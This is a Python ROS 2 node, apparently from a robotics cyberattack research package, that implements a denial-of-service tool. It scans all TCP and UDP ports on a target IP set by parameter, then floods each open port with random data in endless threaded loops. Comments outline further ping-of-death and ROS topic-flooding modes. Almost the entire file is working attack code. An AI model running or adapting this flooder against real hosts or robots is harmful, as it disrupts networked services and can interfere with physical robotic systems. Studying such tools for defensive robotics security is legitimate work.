import rclpy, sys
from rclpy.node import Node
from rclpy import Parameter
from std_srvs.srv import Empty
from rcl_interfaces.srv import GetParameters
from ros2node.api import get_node_names
from roboticpark_cyberattacks.dosattack_scan import scan_tcp_ports, scan_udp_ports
import random, socket
import concurrent.futures

class dosnode(Node):
    def __init__(self):
        super().__init__("dosnode")
        self.declare_parameter('dos_ip_objective', "Unset")
        self.declare_parameter('dos_objective', "Unset")
        self.declare_parameter('dos_type', 'Unset')
        self.declare_parameter('dos_repetitions', '0')

def printargs(node):
    """Prints every param present in the node and its values

       Parameters
       ----------
       node: Node
         The node 
    """
    
    for i in node.get_parameters_by_prefix(''):
        pamname=i
        pamvalue=node.get_parameter(i)._value
        #pamvalue=node.get_parameter_or(pamname).get_parameter_value()
        node.get_logger().info(f'Name of parameter:{pamname}   Value of the parameter: {pamvalue}')

def checkService(node):
    objectiveParam = node.get_parameter('dos_objective')._value
    client = node.create_client(GetParameters, f'/{objectiveParam}/get_parameters')
    if not client.wait_for_service(timeout_sec=5.0):
        node.get_logger().info(f'Not able to connect that node {objectiveParam}')
        sys.exit()

def dosSendRandomGarbageUDP(ipdest,node,ports,socketObject):
    print(ports)
    futures = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(ports)) as executor:
        for port in ports:
            futures.append(executor.submit(dosSendRandomGarbageAuxUDP,ip=ipdest,node=node,port=port,socketObject=socketObject))

def dosSendRandomGarbageAuxUDP(ip,node,port,socketObject):
    data = (str(random.getrandbits(4096))).encode()
    s = socket.socket(socket.AF_INET, socketObject)
    node.get_logger().info(f'Launching garbage into {ip} udp port {port}')
    while True:
        s.sendto(data, (ip, port))

def dosSendRandomGarbageTCP(ipdest,node,ports,socketObject):
    print(ports)
    futures = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(ports)) as executor:
        for port in ports:
            futures.append(executor.submit(dosSendRandomGarbageAuxTCP,ip=ipdest,node=node,port=port,socketObject=socketObject))

def dosSendRandomGarbageAuxTCP(ip,node,port,socketObject):
    while True:
        try: 
            data = (str(random.getrandbits(4096))).encode()
            s = socket.socket(socket.AF_INET, socketObject)
            s.connect((ip, port))
            node.get_logger().info(f'Launching garbage into {ip} tcp port {port}')
            s.sendall(data)
            s.close()
        except (socket.error, BrokenPipeError) as e:
            print(f"Error: {e}. Reconnecting...")


def main():
    rclpy.init()
    mydosnode = dosnode()
    printargs(mydosnode)


    ipobjectiveParam = mydosnode.get_parameter('dos_ip_objective')._value
    dostype = mydosnode.get_parameter('dos_type')._value
    portrange = range(1, 65535)  # Escanea los puertos del 1 al 1024

    if ipobjectiveParam == 'Unset':
        checkService(mydosnode)
        mydosnode.get_logger().info(f'We try to fill any of the topics:  {dostype} was chosen')
    else:
        mydosnode.get_logger().info(f'Regular dos attack, we can choose between ping and random garbage:  {dostype} was chosen')

        if dostype == 'garbage':
            print('tcports')
            dosSendRandomGarbageTCP(ipobjectiveParam,mydosnode,scan_tcp_ports(ipobjectiveParam,portrange),socket.SOCK_STREAM)
            if ipobjectiveParam != '127.0.0.1':
                print('udpports')
                dosSendRandomGarbageUDP(ipobjectiveParam,mydosnode,scan_udp_ports(ipobjectiveParam,portrange),socket.SOCK_DGRAM)
        else:
            if dostype == 'bruteforce':
                print('Bruteforcing')

    
    # In ROS2 there is no mode right now of getting the ip of the node which manages a node. so we are going to take a parameter, 
    # it will be the ip
    # TODO: Maybe I should try DDS with python to get it. 
    # We will have two DOS modes
    # 1.- We will dos the host by ip. network layer. We need to provide the ip or the host. In this case, we cand send garbage to ports. 
    # Otherwise we can ping-death the host. 
    # 2.- We will try to fill the ros node's topics to make it to fail. 
    # So we would have 3 ways.


    rclpy.spin(mydosnode)

    rclpy.shutdown()


if __name__ == '__main__':
    main()
